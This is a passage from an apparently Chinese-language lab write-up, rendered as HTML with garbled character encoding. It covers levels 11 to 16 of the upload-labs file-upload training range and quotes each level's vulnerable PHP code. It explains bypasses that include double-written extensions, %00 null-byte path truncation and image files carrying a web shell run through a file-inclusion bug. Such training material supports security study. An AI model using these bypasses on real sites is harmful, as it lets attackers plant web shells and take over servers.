class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="PASS-11"><a href="#PASS-11" class="headerlink" title="PASS-11"></a>PASS-11</h2><p>ä»£ç å…ˆå†™äº†é»‘åå•ï¼Œç„¶åå¯¹é»‘åå•åç¼€æ›¿æ¢ä¸ºç©ºã€‚æ‰€ä»¥å¯ä»¥åˆ©ç”¨åŒå†™åç¼€è¿›è¡Œç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/eef123f0f52146cfadab0c53e6f3120d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/5a22dc5b90184cb591f324b7c9f2af91.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-12"><a href="#PASS-12" class="headerlink" title="PASS-12"></a>PASS-12</h2><p>ä»æºç ä¸­åˆ¤æ–­ï¼Œæ˜¯ç™½åå•è¿‡æ»¤ï¼Œåªå…è®¸ä¸Šä¼ ä»¥ä¸‹ä¸‰ç§å›¾ç‰‡æ ¼å¼ï¼Œè¿™ä¸ªä¹Ÿæ˜¯æˆ‘ä»¬åœ¨å®æˆ˜ä¸­æ¯”è¾ƒå¸¸è§çš„ä¸€ç§æƒ…å½¢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å½“æˆ‘ä»¬æŠ“åŒ…æ—¶ï¼Œå‘ç°æš´éœ²äº†ä¸Šä¼ çš„è·¯å¾„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è·¯å¾„åä½¿ç”¨<code>%00</code>è¿›è¡Œæˆªæ–­<br><img src="https://img-blog.csdnimg.cn/a35d577ab1a749da99c1a64f4244db42.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_18,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼Œé¡ºå¸¦ä¸€æåˆ©ç”¨æˆåŠŸçš„æ¡ä»¶å¿…é¡»æ˜¯PHPç‰ˆæœ¬å°äº5.3å¹¶ä¸”<code>magic_quotes_gpc</code>è®¾ç½®ä¸ºOffã€‚å› æ­¤è¿™ç§åˆ©ç”¨æ–¹å¼ä¸€èˆ¬ä¸æ€ä¹ˆå¸¸è§äº†ï¼Œå› ä¸ºå¾ˆå°‘å‚å•†æ¶è®¾ç½‘ç«™æ—¶ä¼šåŒæ—¶æ»¡è¶³è¿™ä¸¤ä¸ªæ¡ä»¶ã€‚ç»è¿‡åå¤æµ‹è¯•ï¼Œå†°èé©¬å¯ä»¥ä¸Šä¼ æˆåŠŸä½†æ˜¯ä¸èƒ½æˆåŠŸè§£æï¼Œæ‰€ä»¥åªèƒ½é€‰ç”¨ä¸€å¥è¯æœ¨é©¬<br><img src="https://img-blog.csdnimg.cn/94728315296c40f9bcad70114bee754c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/b1e8e8b580234200b8eb7591de34f8ff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-13"><a href="#PASS-13" class="headerlink" title="PASS-13"></a>PASS-13</h2><p>å’Œç¬¬åäºŒå…³çš„ä¸»è¦åŒºåˆ«æ˜¯ï¼Œimg_pathçš„æäº¤æ–¹å¼ç”±GETæ–¹å¼è½¬æ¢ä¸ºPOSTæ–¹å¼ã€‚åˆ©ç”¨çš„æ–¹å¼ä¹Ÿæ˜¯ä½¿ç”¨%00è¿›è¡Œæˆªæ–­ï¼Œä½†æ˜¯postå’Œgetä¸åŒçš„æ˜¯ï¼Œpostä¸ä¼šåƒgetå¯¹%00è¿›è¡Œè§£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆå…ˆæŠ“åŒ…åˆ†æï¼Œåœ¨postçš„ä¸Šä¼ è·¯å¾„ä¸Šæ·»åŠ shell.phpæ–‡ä»¶ï¼Œä¸Šä¼ æ ¼å¼æ”¹ä¸ºjpg<br><img src="https://img-blog.csdnimg.cn/5623d63d5c0342ad91c2533a037d82ab.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_16,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶ååœ¨hexä¸­ï¼Œ70åæ·»åŠ byteï¼Œç‚¹å‡»ä¸Šä¼ ï¼Œå› ä¸ºhexçš„70è½¬æ¢æˆå­—ç¬¦ä¸²å½¢å¼å°±æ˜¯p<br><img src="https://img-blog.csdnimg.cn/23be7739549043d5a45c55e7e7f76fa5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€åä¸Šçº¿æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/5df24c3a0a1e49a4984a574517316fa5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-14"><a href="#PASS-14" class="headerlink" title="PASS-14"></a>PASS-14</h2><p>ä»ä»£ç å±‚é¢ä¸Šçœ‹ï¼Œé¦–å…ˆå…ˆä»¥äºŒè¿›åˆ¶å½¢å¼è¯»å–æ–‡ä»¶å†…å®¹çš„å‰ä¸¤ä½ï¼Œç„¶åè§£åŒ…ï¼Œé€šè¿‡æ‹¼æ¥å‰ä¸¤ä½å­—ç¬¦åˆ¤æ–­æ–‡ä»¶ç±»å‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å…ˆä½¿ç”¨ä¸€å¼ æ­£å¸¸çš„å›¾ç‰‡å’ŒåŒ…å«æœ¨é©¬çš„phpæ–‡ä»¶ï¼Œç„¶ååˆæˆä¸€ä¸ªåŒ…å«æœ¨é©¬å†…å®¹çš„å›¾ç‰‡<br><img src="https://img-blog.csdnimg.cn/88c153ffbd5e4d91b0c6b553bc7ff997.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/070ce8dc04dd4515a941bda9e93bbb0e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸Šä¼ æˆåŠŸä¹Ÿå¯ä»¥æ­£å¸¸è®¿é—®<br><img src="https://img-blog.csdnimg.cn/691c97147d574d0c998f88c6e28693d5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/36fdd75cfb944dc3b3768fc36cb5f216.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç´§æ¥ç€æˆ‘ä»¬è¦åˆ©ç”¨LFIæ¼æ´å¯¹å›¾ç‰‡é©¬è¿›è¡Œä¸Šçº¿(ç»è¿‡åå¤æµ‹è¯•ï¼ŒPHP5.0ä½ç‰ˆæœ¬çš„éƒ½ä¸èƒ½æˆåŠŸè§£æå›¾ç‰‡æœ¨é©¬ï¼Œå¯èƒ½è¦5.6ä»¥ä¸Šçš„ç‰ˆæœ¬æ‰èƒ½è§£ææˆåŠŸ)</p>
<p><img src="https://img-blog.csdnimg.cn/655f50c42b054d4d9abd9278fa3703e6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/907be04871ad4978bdb1f67ec437c937.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-15"><a href="#PASS-15" class="headerlink" title="PASS-15"></a>PASS-15</h2><p>å’Œç¬¬14å…³ç›¸åŒï¼Œä½†æ˜¯è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>getimagesize</code>å‡½æ•°æ£€æŸ¥ä¸Šä¼ çš„æ˜¯å¦ä¸ºå›¾ç‰‡ï¼Œåˆ©ç”¨æ–¹æ³•å’Œä¸Šé¢ä¸€è‡´</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="PASS-16"><a href="#PASS-16" class="headerlink" title="PASS-16"></a>PASS-16</h2><p>è¿™å…³ä½¿ç”¨çš„æ˜¯<code>exif_imagetype</code>å‡½æ•°æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨æ–¹å¼å’Œä¸Šé¢ä¸€è‡´ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
